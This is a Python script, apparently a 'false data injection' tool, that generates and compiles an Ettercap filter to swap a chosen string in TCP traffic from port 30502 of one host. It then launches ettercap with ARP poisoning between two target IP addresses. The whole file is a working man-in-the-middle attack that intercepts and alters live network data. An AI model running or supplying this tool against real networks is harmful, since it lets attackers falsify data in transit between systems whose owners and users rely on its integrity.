import os
#import sys
import subprocess
import argparse

def generate_filter(ipadr_src, ipadr_dst, replace_string, custom_string):
    filter_data= f"""
if (ip.src == '{ipadr_src}') {{
    if (tcp.src == 30502) {{
        if (search(DATA.data, "{replace_string}")) {{
            replace("{replace_string}", "{custom_string}");
        }}
    }}
}}
        """
    with open("etter_filter_auto.ef","w") as new_file:
        new_file.write(filter_data)
    print("Saved filter file in:", os.getcwd())


def compile_filter():
    cmd = ["etterfilter","etter_filter_auto.ef","-o","etter_filter_auto.ef.ec"]
    subprocess.run(cmd,check=True)
    print("Filter Compiled")

def run_ettercap(ipadr_src, ipadr_dst):
    cmd = ["sudo", "ettercap", "-T", "-q", "-F", "etter_filter_auto.ef.ec", "-M", "arp", f"//{ipadr_src}//", f"//{ipadr_dst}//"]
    subprocess.run(cmd, check=True)
    print("Ruiing Ettercap filter")


#if len(sys.argv) != 5:
#    print("Incorrect Command")
#    sys.exit(1)
#ipadr_src = sys.argv[1]
#ipadr_dst = sys.argv[2]
#replace_string = sys.argv[3]
#custom_string = sys.argv[4]
    
parser = argparse.ArgumentParser(description='Generate and apply Ettercap filter.')
parser.add_argument('-ipsr', '--ip_source', type=str, required=True, help='Source IP address')
parser.add_argument('-ipdst', '--ip_destination', type=str, required=True, help='Destination IP address')
parser.add_argument('-rstr', '--replace_string', type=str, required=True, help='String to be replaced')
parser.add_argument('-cstr', '--custom_string', type=str, required=True, help='Custom string to replace with')
args = parser.parse_args()

ipadr_src = args.ip_source
ipadr_dst = args.ip_destination
replace_string = args.replace_string
custom_string = args.custom_string

generate_filter(ipadr_src, ipadr_dst, replace_string, custom_string)
compile_filter()
run_ettercap(ipadr_src, ipadr_dst)


#input
#python Custom_FDI.py -ipsr 192.168.1.12 -ipdst 192.168.1.21 -rstr <anything> -cstr <something>